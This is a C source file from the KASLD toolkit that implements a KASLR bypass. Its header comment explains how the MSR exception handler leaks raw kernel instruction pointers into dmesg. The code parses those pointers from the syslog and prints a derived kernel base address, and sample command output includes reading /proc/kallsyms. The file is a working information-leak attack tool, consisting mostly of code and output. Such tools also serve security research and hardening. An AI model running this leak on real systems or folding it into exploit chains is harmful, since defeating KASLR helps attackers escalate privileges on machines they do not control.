// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for native_read_msr and native_write_msr function pointers.
//
// The `ex_handler_msr` exception handler function prints registers
// (including RIP) to the kernel log:
//
// pr_warn("unchecked MSR access error: WRMSR to 0x%x (tried to write 0x%08x%08x) at rIP: 0x%lx (%pS)\n",
//        (unsigned int)regs->cx, (unsigned int)regs->dx,
//        (unsigned int)regs->ax,  regs->ip, (void *)regs->ip);
//
// pr_warn("unchecked MSR access error: RDMSR from 0x%x at rIP: 0x%lx (%pS)\n",
//        (unsigned int)regs->cx, regs->ip, (void *)regs->ip);
//
// regs->ip (RIP) address is printed as a raw pointer using "%lx" printk format.
//
// The "%pS" printk format prints the symbol name; however, if kernel symbols
// are disabled (CONFIG_KALLSYMS=n) then raw pointers are printed instead.
//
// Kernels may be compiled without debugging symbols to decrease the size of
// the kernel image.
//
// Prior to kernel v5.2-rc1~168^2^2 on 2019-03-25, the "%pF" printk format
// was used instead of "%pS". This printed raw function pointers.
//
// $ dmesg | grep "unchecked MSR access error"
// [    0.133554] unchecked MSR access error: RDMSR from 0x852 at rIP: 0xffffffffad467c37 (native_read_msr+0x7/0x40)
// $ sudo grep native_read_msr /proc/kallsyms 
// [sudo] password for test: 
// ffffffffad467bf0 t native_read_msr_safe
// ffffffffad467c30 t native_read_msr
// $ ./build/dmesg_ex_handler_msr.o 
// [.] searching dmesg for native_[read|write]_msr function pointer ...
// leaked native_[read|write]_msr: ffffffffad467c37
// possible kernel base: ffffffffad400000
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/x86/mm/extable.c
// https://www.kernel.org/doc/html/latest/core-api/printk-formats.html
// https://cateee.net/lkddb/web-lkddb/KALLSYMS.html
// https://github.com/torvalds/linux/commit/d75f773c86a2b8b7278e2c33343b46a4024bc002
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long search_dmesg_ex_handler_msr() {
  char *syslog;
  char *ptr;
  char *endptr;
  char *addr_buf;
  const char *needle = " at rIP: 0x";
  int size;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;

  printf(
      "[.] searching dmesg for native_[read|write]_msr function pointer ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  ptr = strtok(syslog, "\n");
  while ((ptr = strtok(NULL, "\n")) != NULL) {
    addr_buf = strstr(ptr, needle);

    if (addr_buf == NULL)
      continue;

    leaked_addr = strtoul(&addr_buf[strlen(needle)], &endptr, 16);

    if (!leaked_addr)
      continue;

    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
      // printf("Found kernel pointer: %lx\n", leaked_addr);
      if (!addr || leaked_addr < addr)
        addr = leaked_addr;
    }
  }

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = search_dmesg_ex_handler_msr();
  if (!addr)
    return 1;

  printf("leaked native_[read|write]_msr: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
